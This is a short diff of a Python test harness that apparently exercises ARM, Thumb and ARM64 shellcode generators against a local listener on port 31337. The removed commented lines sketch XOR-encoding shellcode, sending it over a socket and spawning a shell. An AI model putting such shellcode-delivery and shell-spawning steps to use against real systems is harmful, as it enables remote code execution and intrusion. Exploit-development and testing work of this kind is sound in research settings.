@@ -4,7 +4,7 @@ from TesterModule import *
 import sys
 import time
 
-HOST = 'v1'
+HOST = 'localhost'
 PORT = 31337
 
 def armTest(scgen):
@@ -110,28 +110,14 @@ def armTest(scgen):
         except:
             print "[EXCEPT] %s" % tc
 
-    ls()
-
+    acceptloop()
 
 def Run():
     sc_thumb = thumbSCGen()
     sc_arm   = armSCGen()
     sc_arm64 = arm64SCGen()
 
-    armTest(sc_arm)
-
-    # 
-
-    #xor_encoder_with_scode_binary = MakeXorShellcode( scode_binary )
-
-    # make a socket and a file
-    #(s, f) = makeSocket(HOST, PORT)
-
-    # sends/writes a shellcode
-    #f.write(xor_encoder_with_scode_binary + '\n')
-
-    #(s2, f2) = makeSocket(HOST, u16Port)
-    #spawnAShell(s2)
+    armTest(sc_arm64)
 
 if __name__ == '__main__':
     Run()
